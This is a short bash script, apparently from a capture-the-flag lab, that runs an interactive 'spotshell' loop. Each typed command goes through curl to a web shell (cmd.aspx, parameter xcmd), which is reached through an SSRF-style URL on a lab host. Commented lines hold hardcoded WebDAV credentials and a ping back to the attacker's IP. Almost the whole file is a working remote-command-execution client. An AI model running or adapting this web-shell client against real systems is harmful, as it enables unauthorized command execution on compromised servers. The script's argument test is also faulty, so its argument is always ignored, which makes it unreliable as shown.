#!/bin/bash
#http://10.10.10.67/webdav_test_inception/s.php

if [ $1='' ]; then
	url='http://10.10.10.57:62696/Test.asp?u=http://localhost/cmd.aspx'
else 
	url=$1
fi

while true; do
read -p "spotshell#: " cmd
curl --data-urlencode "xcmd=$cmd" $url -G -v 2>&1 | grep -i status
#curl --basic --user 'webdav_tester:babygurl69' --data-urlencode "cmd=$cmd" $1 -G
# http://10.10.10.57:62696/Test.asp?u=http://localhost/cmd.aspx?xcmd=ping%2010.10.17.88
done;
